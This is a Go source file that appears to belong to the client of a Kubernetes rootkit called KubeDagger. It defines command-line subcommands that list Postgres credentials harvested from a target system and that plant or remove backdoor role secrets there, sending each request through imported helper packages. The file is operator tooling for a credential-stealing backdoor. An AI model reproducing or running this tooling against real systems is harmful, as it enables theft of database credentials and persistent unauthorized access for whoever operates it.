package run

import (
	"fmt"
	"strings"

	"github.com/spf13/cobra"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/postgres"
)

var cmdPostgresCredentialsList = &cobra.Command{
	Use:   "list",
	Short: "list postgres credentials",
	Long:  "list returns the list of the Postgres credentials detected on the target system",
	RunE:  getPostgresCredentialsCmd,
}

var cmdPutPGBackdoorSecret = &cobra.Command{
	Use:   "put",
	Short: "put overrides a set of Postgres credentials",
	Long:  "put is used to override a set of Postgres credentials on the target system (the provided role needs to exist)",
	RunE:  putPostgresRoleCmd,
}

var cmdDelPGBackdoorSecret = &cobra.Command{
	Use:   "delete",
	Short: "delete removes a set of Postgres credentials",
	Long:  "delete is used to remove a set of Postgres credentials from the target system",
	RunE:  delPostgresRoleCmd,
}

func getPostgresCredentialsCmd(cmd *cobra.Command, args []string) error {
	return postgres.SendGetPostgresSecretsListRequest(options.Target, options.Output)
}

func putPostgresRoleCmd(cmd *cobra.Command, args []string) error {
	if len(options.Role) == 0 {
		return fmt.Errorf("'role' is required")
	}
	if len(options.Role) >= model.PostgresRoleLen {
		return fmt.Errorf("'role' must be at most %d characters long: %s", model.PostgresRoleLen, options.Role)
	}
	if strings.Contains(options.Role, "#") {
		return fmt.Errorf("'role' cannot contain '#': %s", options.Role)
	}
	return postgres.SendPutPostgresRoleRequest(options.Target, options.Role, options.Secret)
}

func delPostgresRoleCmd(cmd *cobra.Command, args []string) error {
	if len(options.Role) == 0 {
		return fmt.Errorf("'role' is required")
	}
	if len(options.Role) >= model.PostgresRoleLen {
		return fmt.Errorf("'role' must be at most %d characters long: %s", model.PostgresRoleLen, options.Role)
	}
	if strings.Contains(options.Role, "#") {
		return fmt.Errorf("'role' cannot contain '#': %s", options.Role)
	}
	return postgres.SendDelPostgresRoleRequest(options.Target, options.Role)
}

func init() {
	cmdPostgresCredentialsList.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file to write into")
	cmdPutPGBackdoorSecret.PersistentFlags().StringVar(
		&options.Secret,
		"secret",
		"",
		"defines the Postgres secret to send")
	cmdPutPGBackdoorSecret.PersistentFlags().StringVar(
		&options.Role,
		"role",
		"",
		"defines the Postgres role to send")
	cmdDelPGBackdoorSecret.PersistentFlags().StringVar(
		&options.Role,
		"role",
		"",
		"defines the Postgres role to delete")

	cmdPostgresProg.AddCommand(cmdPostgresCredentialsList)
	cmdPostgresProg.AddCommand(cmdPutPGBackdoorSecret)
	cmdPostgresProg.AddCommand(cmdDelPGBackdoorSecret)
	KUBEDaggerClient.AddCommand(cmdPostgresProg)
}
